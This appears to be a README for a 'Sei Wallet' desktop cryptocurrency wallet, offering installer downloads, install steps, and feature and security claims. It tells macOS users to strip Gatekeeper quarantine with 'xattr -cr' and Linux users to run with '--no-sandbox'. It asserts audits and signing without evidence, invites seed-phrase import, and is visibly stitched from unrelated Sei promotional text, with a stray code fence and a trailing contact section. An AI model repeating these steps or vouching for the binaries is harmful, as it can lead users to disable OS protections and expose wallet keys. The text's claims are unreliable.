<div align="center">

<img src="https://seiwallet.net/assets/sei-wallet-logo-C8456lrF.png" alt="Sei Wallet logo" width="110" />

# Sei Wallet

### The secure, open-source **desktop wallet for SEI**

**Stake, swap, and self-custody your SEI from one fast desktop app — built EVM-first for the Sei chain, audited, signed, and free.**

Sei is the fastest general purpose L1 blockchain and the first parallelized EVM. This allows Sei to get the best of Solana and Ethereum - a hyper optimized execution layer that benefits from the tooling and mindshare around the EVM.

 Overview
**Sei** is a high-performance, low-fee, delegated proof-of-stake blockchain designed for developers. It supports optimistic parallel execution of both EVM and CosmWasm, opening up new design possibilities. With unique optimizations like twin turbo consensus and SeiDB, Sei ensures consistent 400ms block times and a transaction throughput that’s orders of magnitude higher than Ethereum. This means faster, more cost-effective operations. Plus, Sei’s seamless interoperability between EVM and CosmWasm gives developers native access to the entire Cosmos ecosystem, including IBC tokens, multi-sig accounts, fee grants, and more.

[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-6C5CE7?style=for-the-badge)](#downloads)
[![Latest Release](https://img.shields.io/badge/Latest-v6.6.2-00B894?style=for-the-badge)](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2)
[![Open Source](https://img.shields.io/badge/Open%20Source-Audited-FDCB6E?style=for-the-badge)](#-security)
[![License](https://img.shields.io/badge/License-MIT-FF6B6B?style=for-the-badge)](LICENSE)

</div>

---

## 📥 Downloads

<div align="center">

[![Download for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows11&logoColor=white)](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe)
[![Download for macOS](https://img.shields.io/badge/Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg)
[![Download for Linux](https://img.shields.io/badge/Download-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2-linux-x64.zip)

</div>

| Platform | File | Requires |
|---|---|---|
| 🪟 Windows 10/11 | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) | None |
| 🍎 macOS 12+ (Intel & Apple Silicon) | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) | None |
| 🐧 Linux (x86_64) | [`sei-wallet-v6.6.2-linux-x64.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2-linux-x64.zip) | — |

👉 All versions and SHA-256 checksums: **[Releases page](https://github.com/sei-chain/sei-wallet/releases)** · Full details: [`RELEASES.md`](RELEASES.md)

---

## 🚀 Install

<details open>
<summary><b>Windows</b></summary>

1. [Download `sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe)
2. Run the installer and follow the prompts.
3. Launch **Sei Wallet** from the Start Menu.

No extra dependencies needed.
</details>

<details>
<summary><b>Linux</b></summary>

```bash
unzip sei-wallet-v6.6.2-linux-x64.zip
chmod +x sei-wallet
./sei-wallet
```

If it fails to launch in a sandboxed environment, run with `--no-sandbox`.
</details>

<details>
<summary><b>macOS</b></summary>

1. [Download `sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg)
2. Drag **Sei Wallet** into `Applications`.
3. Launch it from Launchpad.

**If macOS says the app "can't be opened"** (Gatekeeper), run:

```bash
xattr -cr /Applications/Sei\ Wallet.app
```
</details>

---

## ✨ What you get

- **Native staking** — pick a validator, delegate, track rewards, unbond, all in-wallet
- **EVM-first by default** — signs `0x` transactions natively, with read-only support for legacy `sei1` addresses
- **Migration assistance** — moving from Compass, Leap, or Keplr? Import your seed phrase and get guided address association, validator handoff, and rebalancing
- **Hardware wallet support** — use your Ledger via the Ethereum app; transactions sign on-device, Sei Wallet never sees your private key
- **Built for Sei only** — no multi-chain abstraction: `sei1`/`0x`-aware send flow, live validator uptime and commission, one-click DragonSwap / Yei Finance / Citrex connections, explorer links straight to seitrace.com
- Open source, independently audited, and signed at every release

## 🌐 Networks

| Network | Address formats | Use case |
|---|---|---|
| Sei Mainnet | `0x` (EVM) · `sei1` (read-only) | Live funds, staking, swaps |
| Sei Testnet | `0x` (EVM) · `sei1` (read-only) | Development & testing |

---

## 🗂 Where things live

| What | Location |
|---|---|
| Config | `~/.sei-wallet/config.json` (macOS/Linux) · `%APPDATA%\sei-wallet` (Windows) |
| Wallet data (encrypted) | `~/.sei-wallet/keystore/` |
| Logs | `~/.sei-wallet/logs/` |
| Backups | `~/.sei-wallet/backups/` |

## ⚠️ Security

**Your recovery phrase is the only way to restore your wallet — Sei Wallet cannot recover it for you.** Never share it or enter it on a website. We are not responsible for funds lost to a leaked seed phrase, phishing, or unofficial downloads. Always download from this repository's [Releases page](https://github.com/sei-chain/sei-wallet/releases) — never a third-party mirror. Every release is signed and published with SHA-256 checksums; verify before you trust. Encrypted local backups are written automatically to the path above.

---

## 🛠 Development

**Prerequisites:** Node.js 18+, Rust 1.75+, `pnpm`

```bash
git clone https://github.com/sei-chain/sei-wallet.git
cd sei-wallet
pnpm install
```

```bash
pnpm dev              # run locally
pnpm build:win         # build Windows installer
pnpm build:mac         # build macOS dmg
pnpm build:linux       # build Linux zip
pnpm lint && pnpm format
```

**Releasing:** bump `version` → `git tag vX.Y.Z && git push --tags` → CI builds and publishes all three installers plus `SHA256SUMS.txt` to the [Releases page](https://github.com/sei-chain/sei-wallet/releases).

## 📦 Stack

[Electron](https://www.electronjs.org/) · [React](https://react.dev/) · [ethers.js](https://docs.ethers.org/) · Rust keyring core · Ledger Ethereum app integration

---

## 💬 Support

Found a bug or have a feature request? Open a [GitHub Issue](https://github.com/sei-chain/sei-wallet/issues).

## License

[MIT](LICENSE)

```
# Build with Us!
If you are interested in building with Sei Network: 
Email us at team@seinetwork.io 
DM us on Twitter https://twitter.com/SeiNetwork
